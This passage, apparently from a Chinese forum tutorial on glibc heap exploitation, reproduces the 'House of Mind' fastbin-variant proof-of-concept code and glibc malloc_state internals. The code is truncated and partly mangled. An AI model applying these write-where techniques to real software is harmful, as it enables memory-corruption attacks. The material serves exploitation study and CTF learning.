
`image-20231013085422164.png` (59.18 KB, 下载次数: 2)

[href="forum.php?mod=attachment&aid=MjY0OTA1NHxhODg1OWRiOHwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0OTA1NHxhODg1OWRiOHwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

116

2023-10-14 12:35 上传

![](https://attach.52pojie.cn/forum/202310/14/123601ezj868bhcf1qfjwh.png)

`image-20231013085545532.png` (5.95 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjY0OTA1NXw5YWFjZDAxMHwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0OTA1NXw5YWFjZDAxMHwxNzkzNTczMDc3fDE2ODA4NnwxODQ0Mjg0&nothumb=yes)

117

2023-10-14 12:36 上传

然后申请两次 `0x110` 大小的 chunk，分别为 `p3`、`p4`，会将 `small_chunk` 和 `stack1` 取出来，然后覆盖 `main` 返回地址为目标函数地址即可完成任意地址写。

### 3. `house_of_mind_fastbin`

### 4. 源码

```
#include 
#include 
#include 
#include 
#include 
#include 

/*

House of Mind - Fastbin Variant
==========================

This attack is similar to the original 'House of Mind' in that it uses
a fake non-main arena in order to write to a new location. This
uses the fastbin for a WRITE-WHERE primitive in the 'fastbin'
variant of the original attack though. The original write for this
can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. 

By being able to allocate an arbitrary amount of chunks, a single byte
overwrite on a chunk size and a memory leak, we can control a super
powerful primitive. 

This could be used in order to write a freed pointer to an arbitrary
location (which seems more useful). Or, this could be used as a
write-large-value-WHERE primitive (similar to unsortedbin attack). 
 Both are interesting in their own right though but the first
option is the most powerful primitive, given the right setting.

Malloc chunks have a specified size and this size information
special metadata properties (prev_inuse, mmap chunk and non-main arena). 
The usage of non-main arenas is the focus of this exploit. For more information 
on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/. 

First, we need to understand HOW the non-main arena is known from a chunk.

This the 'heap_info' struct: 

struct _heap_info
{
  mstate ar_ptr;           // Arena for this heap. ar_ptr : &main_arena)
- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127

This macro takes the 'ptr' and subtracts a large value because the 
'heap_info' should be at the beginning of this heap section. Then, 
using this, it can find the 'arena' to use. 

The idea behind the attack is to use a fake arena to write pointers 
to locations where they should not go but abusing the 'arena_for_chunk' 
functionality when freeing a fastbin chunk.

This POC does the following things: 
- Finds a valid arena location for a non-main arena.
- Allocates enough heap chunks to get to the non-main arena location where 
  we can control the values of the arena data. 
- Creates a fake 'heap_info' in order to specify the 'ar_ptr' to be used as the arena later.
- Using this fake arena (ar_ptr), we can use the fastbin to write
  to an unexpected location of the 'ar_ptr' with a heap pointer. 

Requirements: 
- A heap leak in order to know where the fake 'heap_info' is located at.
    - Could be possible to avoid with special spraying techniques
- An unlimited amount of allocations
- A single byte overflow on the size of a chunk
    - NEEDS to be possible to put into the fastbin. 
    - So, either NO tcache or the tcache needs to be filled. 
- The location of the malloc state(ar_ptr) needs to have a value larger
  than the fastbin size being freed at malloc_state.system_mem otherwise
  the chunk will be assumed to be invalid.
    - This can be manually inserted or CAREFULLY done by lining up
      values in a proper way. 
- The NEXT chunk, from the one that is being freed, must be a valid size
(again, greater than 0x20 and less than malloc_state.system_mem)

Random perks:
- Can be done MULTIPLE times at the location, with different sized fastbin
  chunks. 
- Does not brick malloc, unlike the unsorted bin attack. 
- Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak. 

************************************
Written up by Maxwell Dulin (Strikeout) 
************************************
*/

int main()
{
    printf("House of Mind - Fastbin Variant\n");
    puts("==================================");
    printf("The goal of this technique is to create a fake arena\n");
    printf("at an offset of HEAP_MAX_SIZE\n");

    printf("Then, we write to the fastbins when the chunk is freed\n");
    printf("This creates a somewhat constrained WRITE-WHERE primitive\n");
    // Values for the allocation information.
    int HEAP_MAX_SIZE = 0x4000000;
    int MAX_SIZE = (128*1024) - 0x100; // MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635

    printf("Find initial location of the heap\n");
    // The target location of our attack and the fake arena to use
    uint8_t* fake_arena = malloc(0x1000);
    uint8_t* target_loc = fake_arena + 0x28;

    uint8_t* target_chunk = (uint8_t*) fake_arena - 0x10;

    /*
    Prepare a valid 'malloc_state' (arena) 'system_mem'
    to store a fastbin. This is important because the size
    of a chunk is validated for being too small or too large
    via the 'system_mem' of the 'malloc_state'. This just needs
    to be a value larger than our fastbin chunk.
    */
    printf("Set 'system_mem' (offset 0x880) for fake arena\n");
    fake_arena[0x880] = 0xFF;
    fake_arena[0x881] = 0xFF;
    fake_arena[0x882] = 0xFF;

    printf("Target Memory Address for overwrite: %p\n", target_loc);
    printf("Must set data at HEAP_MAX_SIZE (0x%x) offset\n", HEAP_MAX_SIZE);

    // Calculate the location of our fake arena
    uint64_t new_arena_value = (((uint64_t) target_chunk) + HEAP_MAX_SIZE) & ~(HEAP_MAX_SIZE - 1);
    uint64_t* fake_heap_info = (uint64_t*) new_arena_value;

    uint64_t* user_mem = malloc(MAX_SIZE);
    printf("Fake Heap Info struct location: %p\n", fake_heap_info);
    printf("Allocate until we reach a MAX_HEAP_SIZE offset\n");

    /*
    The fake arena must be at a particular offset on the heap.
    So, we allocate a bunch of chunks until our next chunk
    will be in the arena. This value was calculated above.
    */
    while((long long)user_mem 
```

### 4. 基础知识

`2.23` 版本和 `2.27` 以后间 `fastbinY[4]` 数组的偏移不同，`2.23` 为 `0x38`，`2.27` 以后加入了 `have_fastchunks`，需要向后偏移 `0x8` 字节，即偏移为 `0x40`。`2.23` 的 `malloc_state` 及 `_heap_info` 源码如下：

```
struct malloc_state

{

  /* Serialize access.  */

  mutex_t mutex;

  /* Flags (formerly in max_fast).  */

  int flags;

  /* Fastbins */

  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */

  mchunkptr top;

  /* The remainder from the most recent split of a small request */

  mchunkptr last_remainder;

  /* Normal bins packed as described above */

  mchunkptr bins[NBINS * 2 - 2];

  /* Bitmap of bins */

  unsigned int binmap[BINMAPSIZE];

  /* Linked list */

  struct malloc_state *next;

  /* Linked list for free arenas.  Access to this field is serialized

     by free_list_lock in arena.c.  */

  struct malloc_state *next_free;

  /* Number of threads attached to this arena.  0 if the arena is on

     the free list.  Access to this field is serialized by

     free_list_lock in arena.c.  */

  INTERNAL_SIZE_T attached_threads;

  /* Memory allocated from the system in this arena.  */

  INTERNAL_SIZE_T system_mem;

  INTERNAL_SIZE_T max_system_mem;

};
```
